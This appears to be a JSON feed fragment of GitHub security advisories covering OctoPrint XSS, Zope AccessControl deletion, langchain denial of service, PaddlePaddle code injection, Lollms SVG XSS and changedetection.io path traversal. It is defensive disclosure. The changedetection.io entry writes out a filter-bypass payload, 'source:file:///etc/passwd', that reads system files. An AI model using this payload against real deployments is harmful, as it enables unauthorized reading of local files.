            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>OctoPrint versions up until and including 1.10.2 are vulnerable to reflected XSS vulnerabilities through its Jinja2 template system, as this is not configured to enforce automatic escaping. This affects, among other places, the login dialog and the standalone application key confirmation dialog. </p>\n<p>An attacker who successfully talked a victim into clicking on or through a malicious third party app successfully redirected a victim to a specially crafted link could use this to retrieve or modify sensitive configuration settings, interrupt prints or otherwise interact with the OctoPrint instance in a malicious way.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The above mentioned specific vulnerabilities of the login dialog and the standalone application key confirmation dialog will be patched in the bugfix release 1.10.3 by individual escaping of the detected locations. A global change throughout all of OctoPrint's templating system with the upcoming 1.11.0 release will handle this further, switching to globally enforced automatic escaping and thus reducing the attack surface in general.</p>\n<p>The latter will also improve the security of third party plugins. During a transition period, third party plugins will be able to opt into the automatic escaping. With OctoPrint 1.13.0, automatic escaping will be switched over to be enforced even for third party plugins, unless they explicitly opt-out.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-xvxq-g8hw-fx4g\">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-xvxq-g8hw-fx4g</a></li>\n<li><a href=\"https://github.com/OctoPrint/OctoPrint/commit/b8a6b0a75202edac3bb142a8e4f9041a0b6825bf\">https://github.com/OctoPrint/OctoPrint/commit/b8a6b0a75202edac3bb142a8e4f9041a0b6825bf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49377\">https://nvd.nist.gov/vuln/detail/CVE-2024-49377</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xvxq-g8hw-fx4g\">https://github.com/advisories/GHSA-xvxq-g8hw-fx4g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xvxq-g8hw-fx4g",
            "title": "[OctoPrint] OctoPrint Vulnerable to Reflected XSS in Jinja2 Templates",
            "date_modified": "2024-11-05T21:36:39.000Z",
            "date_published": "2024-11-05T15:05:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xvxq-g8hw-fx4g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Anonymous users can delete the user data maintained by an <code>AccessControl.userfolder.UserFolder</code> which may prevent any privileged access.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem is fixed in version 7.2.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The problem can be fixed by adding <code>data__roles__ = ()</code> to <code>AccessControl.userfolder.UserFolder</code>.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/zopefoundation/AccessControl/issues/159\">https://github.com/zopefoundation/AccessControl/issues/159</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/zopefoundation/AccessControl/security/advisories/GHSA-g5vw-3h65-2q3v\">https://github.com/zopefoundation/AccessControl/security/advisories/GHSA-g5vw-3h65-2q3v</a></li>\n<li><a href=\"https://github.com/zopefoundation/AccessControl/issues/159\">https://github.com/zopefoundation/AccessControl/issues/159</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51734\">https://nvd.nist.gov/vuln/detail/CVE-2024-51734</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g5vw-3h65-2q3v\">https://github.com/advisories/GHSA-g5vw-3h65-2q3v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g5vw-3h65-2q3v",
            "title": "[Zope] Access control vulnerable to user data deletion by anonynmous users",
            "date_modified": "2024-11-05T14:39:52.000Z",
            "date_published": "2024-11-04T23:23:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g5vw-3h65-2q3v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Anonymous users can delete the user data maintained by an <code>AccessControl.userfolder.UserFolder</code> which may prevent any privileged access.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem is fixed in version 7.2.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The problem can be fixed by adding <code>data__roles__ = ()</code> to <code>AccessControl.userfolder.UserFolder</code>.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/zopefoundation/AccessControl/issues/159\">https://github.com/zopefoundation/AccessControl/issues/159</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/zopefoundation/AccessControl/security/advisories/GHSA-g5vw-3h65-2q3v\">https://github.com/zopefoundation/AccessControl/security/advisories/GHSA-g5vw-3h65-2q3v</a></li>\n<li><a href=\"https://github.com/zopefoundation/AccessControl/issues/159\">https://github.com/zopefoundation/AccessControl/issues/159</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51734\">https://nvd.nist.gov/vuln/detail/CVE-2024-51734</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g5vw-3h65-2q3v\">https://github.com/advisories/GHSA-g5vw-3h65-2q3v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g5vw-3h65-2q3v",
            "title": "[AccessControl] Access control vulnerable to user data deletion by anonynmous users",
            "date_modified": "2024-11-05T14:39:52.000Z",
            "date_published": "2024-11-04T23:23:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g5vw-3h65-2q3v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Denial of service in <code>SitemapLoader</code> Document Loader in the <code>langchain-community</code> package, affecting versions below 0.2.5. The <code>parse_sitemap</code> method, responsible for parsing sitemaps and extracting URLs, lacks a mechanism to prevent infinite recursion when a sitemap URL refers to the current sitemap itself. This oversight allows for the possibility of an infinite loop, leading to a crash by exceeding the maximum recursion depth in Python. This vulnerability can be exploited to occupy server socket/port resources and crash the Python process, impacting the availability of services relying on this functionality.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-2965\">https://nvd.nist.gov/vuln/detail/CVE-2024-2965</a></li>\n<li><a href=\"https://huntr.com/bounties/90b0776d-9fa6-4841-aac4-09fde5918cae\">https://huntr.com/bounties/90b0776d-9fa6-4841-aac4-09fde5918cae</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/pull/22903\">https://github.com/langchain-ai/langchain/pull/22903</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/commit/9a877c7adbd06f90a2518152f65b562bd90487cc\">https://github.com/langchain-ai/langchain/commit/9a877c7adbd06f90a2518152f65b562bd90487cc</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/commit/73c42306745b0831aa6fe7fe4eeb70d2c2d87a82\">https://github.com/langchain-ai/langchain/commit/73c42306745b0831aa6fe7fe4eeb70d2c2d87a82</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2024-118.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2024-118.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3hjh-jh2h-vrg6\">https://github.com/advisories/GHSA-3hjh-jh2h-vrg6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3hjh-jh2h-vrg6",
            "title": "[langchain] Denial of service in langchain-community",
            "date_modified": "2024-11-04T15:27:58.000Z",
            "date_published": "2024-06-06T21:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3hjh-jh2h-vrg6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Code injection in <code>paddle.audio.functional.get_window</code> in PaddlePaddle 2.4.0-rc0 allows arbitrary code execution. A <a href=\"https://github.com/PaddlePaddle/Paddle/commit/26c419ca386aeae3c461faf2b828d00b48e908eb\">patch</a> is available on the <code>develop</code> branch of the repository and anticipated to be part of a 2.4 release.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-46742\">https://nvd.nist.gov/vuln/detail/CVE-2022-46742</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2022-002.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2022-002.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/pull/47386\">https://github.com/PaddlePaddle/Paddle/pull/47386</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/26c419ca386aeae3c461faf2b828d00b48e908eb\">https://github.com/PaddlePaddle/Paddle/commit/26c419ca386aeae3c461faf2b828d00b48e908eb</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/paddlepaddle/PYSEC-2022-43063.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/paddlepaddle/PYSEC-2022-43063.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gcjf-29m9-888q\">https://github.com/advisories/GHSA-gcjf-29m9-888q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gcjf-29m9-888q",
            "title": "[paddlepaddle] PaddlePaddle vulnerable to Code Injection",
            "date_modified": "2024-11-01T22:13:43.000Z",
            "date_published": "2022-12-07T09:30:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gcjf-29m9-888q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in the discussion image upload function of the Lollms application, version v9.9, allows for the uploading of SVG files. Due to incomplete filtering in the sanitize_svg function, this can lead to cross-site scripting (XSS) vulnerabilities, which in turn pose a risk of remote code execution. The sanitize_svg function only removes script elements and 'on*' event attributes, but does not account for other potential vectors for XSS within SVG files. This vulnerability can be exploited when authorized users access a malicious URL containing the crafted SVG file.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6581\">https://nvd.nist.gov/vuln/detail/CVE-2024-6581</a></li>\n<li><a href=\"https://github.com/parisneo/lollms/commit/328b960a0de2097e13654ac752253e9541521ddd\">https://github.com/parisneo/lollms/commit/328b960a0de2097e13654ac752253e9541521ddd</a></li>\n<li><a href=\"https://huntr.com/bounties/ad68ecd6-44e2-449b-8e7e-f2b71b1b43c7\">https://huntr.com/bounties/ad68ecd6-44e2-449b-8e7e-f2b71b1b43c7</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/lollms/PYSEC-2024-116.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/lollms/PYSEC-2024-116.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cm59-8rmv-f2cj\">https://github.com/advisories/GHSA-cm59-8rmv-f2cj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cm59-8rmv-f2cj",
            "title": "[lollms] Lollms vulnerable to Cross-site Scripting",
            "date_modified": "2024-11-04T13:50:54.000Z",
            "date_published": "2024-10-29T15:32:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cm59-8rmv-f2cj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When a WebDriver is used to fetch files source:file:///etc/passwd can be used to retrieve local system files, where the more traditional file:///etc/passwd gets blocked</p>\n<h3 id=\"details\">Details</h3>\n<p>The root cause is the payload source:file:///etc/passwdpasses the regex <a href=\"https://github.com/dgtlmoon/changedetection.io/blob/master/changedetectionio/model/Watch.py#L19\">here</a> and also passes the check <a href=\"https://github.com/dgtlmoon/changedetection.io/blob/master/changedetectionio/processors/__init__.py#L35\">here</a> where a traditional file:///etc/passwd would get blocked</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://github.com/user-attachments/files/17591630/CL-ChangeDetection.io.Path.Travsersal-311024-181039.pdf\">CL-ChangeDetection.io Path Travsersal-311024-181039.pdf</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>It depends on where the webdriver is deployed but generally this is a high impact vulnerability </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-cwgg-57xj-g77r\">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-cwgg-57xj-g77r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51483\">https://nvd.nist.gov/vuln/detail/CVE-2024-51483</a></li>\n<li><a href=\"https://github.com/dgtlmoon/changedetection.io/blob/master/changedetectionio/model/Watch.py#L19\">https://github.com/dgtlmoon/changedetection.io/blob/master/changedetectionio/model/Watch.py#L19</a></li>\n<li><a href=\"https://github.com/dgtlmoon/changedetection.io/blob/master/changedetectionio/processors/__init__.py#L35\">https://github.com/dgtlmoon/changedetection.io/blob/master/changedetectionio/processors/__init__.py#L35</a></li>\n<li><a href=\"https://github.com/user-attachments/files/17591630/CL-ChangeDetection.io.Path.Travsersal-311024-181039.pdf\">https://github.com/user-attachments/files/17591630/CL-ChangeDetection.io.Path.Travsersal-311024-181039.pdf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cwgg-57xj-g77r\">https://github.com/advisories/GHSA-cwgg-57xj-g77r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cwgg-57xj-g77r",
            "title": "[changedetection.io] changedetection.io Path Traversal",
            "date_modified": "2024-11-01T21:39:13.000Z",
            "date_published": "2024-11-01T21:39:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cwgg-57xj-g77r"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}